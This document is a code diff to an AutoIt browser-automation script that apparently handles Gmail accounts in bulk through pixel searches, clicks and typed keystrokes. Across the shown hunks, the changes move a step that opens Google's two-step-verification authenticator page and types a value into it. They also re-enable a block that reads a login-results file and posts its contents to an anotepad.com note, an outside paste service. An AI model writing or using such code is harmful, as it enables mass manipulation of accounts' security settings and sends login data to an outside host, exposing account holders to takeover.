@@ -1790,18 +1790,9 @@ EndFunc
 							    $pixcel=PixelSearch(1030,450,1233,700,0x0B57D0)  ;0x114AA7
                                 Sleep(1000)
                                 If IsArray($pixcel) Then MouseClick('left',$pixcel[0]+5,$pixcel[1]+5,1,20)
-                                Sleep(10000)
+                                Sleep(15000)
 
-							MouseClick('left',600,60,1,20)
-							Sleep(2000)
-						    Send('https://myaccount.google.com/two-step-verification/authenticator')
-						    Sleep(1000)
-						    Send('{enter}')
-						    Sleep(10000)
-						    Send($g)
-						    Sleep(1000)
-							Send('{enter}')
-							Sleep(10000)
+
 
                             $pixcel=PixelSearch(16, 87,154, 170,0xFEBB07)  ;0x114AA7
 						    $pixcel2=PixelSearch(18, 130,206,190,0x38A751)
@@ -1818,10 +1809,21 @@ EndFunc
 						EndIf
 					  If $check=1 Then
 
+						MouseClick('left',600,60,1,20)
+						Sleep(2000)
+						Send('https://myaccount.google.com/two-step-verification/authenticator')
+						Sleep(1000)
+						Send('{enter}')
+						Sleep(10000)
+						Send($g)
+						Sleep(1000)
+						Send('{enter}')
+						Sleep(10000)
+
 
 						For $i20=1 to 10
-							$pixcel=PixelSearch(16, 87,154, 170,0x4285F4)  ;0x114AA7
-						    $pixcel2=PixelSearch(18, 130,206,190,0xFBBC05)
+							$pixcel=PixelSearch(16, 87,154, 170,0xFEBB07)  ;0x114AA7
+						    $pixcel2=PixelSearch(18, 130,206,190,0x38A751)
 						    If IsArray($pixcel) Or IsArray($pixcel2) Then $i20=10
                             Sleep(2000)
 						Next
@@ -2077,13 +2079,13 @@ EndFunc
 
 		Next
         Sleep(2000)
-	;	If $vpsso=1 or $vpsso=6 or $vpsso=11 or $vpsso=16 or $vpsso=21 or $vpsso=26 or $vpsso=31 or $vpsso=36 or $vpsso=41 or $vpsso=46 or $vpsso=51 or $vpsso=56 or $vpsso=61 or $vpsso=66 or $vpsso=71 or $vpsso=76 or $vpsso=81 or $vpsso=86 or $vpsso=91 or $vpsso=99  Then
+		If $vpsso=1 or $vpsso=6 or $vpsso=11 or $vpsso=16 or $vpsso=21 or $vpsso=26 or $vpsso=31 or $vpsso=36 or $vpsso=41 or $vpsso=46 or $vpsso=51 or $vpsso=56 or $vpsso=61 or $vpsso=66 or $vpsso=71 or $vpsso=76 or $vpsso=81 or $vpsso=86 or $vpsso=91 or $vpsso=99  Then
 
 			$dataIP=FileRead(@ScriptDir&'\KetQuaDangNhap.txt')
 			Sleep(2000)
 			_postdataIPGmail($dataIP,'https://anotepad.com/note/access/6tfiaiej','https://anotepad.com/notes/6tfiaiej')
 
-		;EndIf
+		EndIf
 
 		Return 	$check4
 
@@ -4583,7 +4585,12 @@ EndFunc
 						   MouseClick('left',1330,103,1,20)
 						EndIf
 						If $i=1 Then
-						   MouseClick('left',800,120,1,20)
+							MouseClick('left',300,650,1,20)
+							Sleep(3000)
+
+
+
+						    MouseClick('left',800,120,1,20)
 						EndIf
 						If $i=2 Then
 						   MouseClick('left',1325,106,1,20)
